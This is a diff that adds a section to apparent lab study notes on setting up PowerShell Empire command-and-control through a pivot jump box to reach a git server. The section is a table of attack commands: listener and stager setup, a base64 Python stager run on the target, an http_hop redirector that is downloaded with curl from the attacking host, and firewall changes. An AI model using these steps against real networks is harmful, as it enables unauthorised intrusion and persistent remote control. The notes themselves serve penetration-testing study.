@@ -83,3 +83,31 @@ We now have everything we need to get this show on the road!
 
 ---
 
+# Your job
+
+
+
+![[Command & Control Empire Diagram.svg]]
+
+
+| <center>Actions</center>                                                 | <center>Machine</center> | <center>Commands</center>                                                                                             |
+| ------------------------------------------------------------------------ | ------------------------ | --------------------------------------------------------------------------------------------------------------------- |
+| Start Empire Server                                                      | Attacking Machine        | `powershell-empire server`                                                                                            |
+| Start Empire CLI                                                         | Attacking Machine        | `powershell-empire client`                                                                                            |
+| Setup HTTP Listener                                                      | Empire CLI               | `uselistener http`                                                                                                    |
+| Create a listener                                                        | Empire CLI               | [[Empire - Listeners]]                                                                                                |
+| Setup Stager                                                             | Empire CLI               | `usestager multi_bash`<br>`set Listener CLIHTTP`<br>`execute`                                                         |
+| Execute stager on target                                                 | Jump box .200            | `echo "import sys,base64,warnings...`                                                                                 |
+| Open firewall port                                                       | Jump box .200            | `firewall-cmd --zone=public --add-port 47000/tcp`                                                                     |
+| Creating hop jump server                                                 | Empire CLI               | `uselistener http_hop`<br>`set Host 10.200.X.200` <br>`set Port 47000`<br>`set RedirectListener CLIHTTP`<br>`execute` |
+| Zip and transfer files `/tmp/http_hop` to jump box target                | Attacking Machine        | `cd /tmp/http_hop && zip -r hop.zip`<br>`sudo python3 -m http.server 80`                                              |
+| Download on target                                                       | Jump box .200            | `curl 10.50.X.X/hop.zip -o hop.zip unzip hop.zip`                                                                     |
+| Create http_hop stager                                                   | Empire CLI               | `usestager multi_launcher`<br>`set Listener http_hop` `execute`                                                       |
+| Setup a PHP Server to host http_hop files                                | Jump box .200            | `php -S 0.0.0.0:47000`                                                                                                |
+| Connect to `git-server` on `.150` and execute `usestager/multi/launcher` |                          |                                                                                                                       |
+After completing the given steps, we have an agent from the Git Server in Starkiller.
+
+![[Git Server-20250114152251549.webp]]
+
+**Next step:** [[Empire - Modules]]
+
